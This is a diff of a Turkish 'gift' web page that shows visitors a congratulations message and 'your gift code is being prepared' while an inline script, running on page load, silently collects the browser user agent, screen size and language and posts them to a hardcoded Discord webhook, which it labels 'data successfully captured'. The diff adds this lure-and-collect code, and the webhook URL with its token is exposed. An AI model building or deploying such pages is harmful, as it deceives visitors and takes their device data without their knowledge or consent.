@@ -1,26 +1,42 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Hediye Çarkı - Test</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding-top: 50px; }
-        .box { border: 2px solid #00ff00; display: inline-block; padding: 20px; border-radius: 15px; }
-    </style>
+    <title>Hediye Sayfası</title>
 </head>
 <body>
-
-    <div class="box">
+    <div style="text-align: center; margin-top: 100px; font-family: sans-serif;">
         <h1>🎁 Tebrikler!</h1>
-        <p>Cihazınıza özel bir hediye tanımlandı.</p>
-        <button onclick="alert('Hediye kodu: TEST-123')">Hediyeyi Gör</button>
+        <p>Hediye kodunuz hazırlanıyor, lütfen bekleyin...</p>
     </div>
 
     <script>
-        // Senin sağladığın Webhook linki
+        // Burayı düzelttim:
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        // Cihazdan toplanan bilgiler
-        const cihazVerisi = {
-            "Cihaz": navigator
-          
+        const bilgiler = {
+            "content": "🔔 **Sisteme Giriş Yapıldı!**",
+            "embeds": [{
+                "title": "Cihaz Bilgileri",
+                "color": 3447003,
+                "fields": [
+                    { "name": "Cihaz Modeli", "value": navigator.userAgent, "inline": false },
+                    { "name": "Ekran Boyutu", "value": window.screen.width + "x" + window.screen.height, "inline": true },
+                    { "name": "Dil", "value": navigator.language, "inline": true }
+                ],
+                "footer": { "text": "Veri başarıyla yakalandı" },
+                "timestamp": new Date()
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(bilgiler)
+        })
+        .then(() => console.log("Mesaj gönderildi!"))
+        .catch(err => console.error("Hata:", err));
+    </script>
+</body>
+</html>
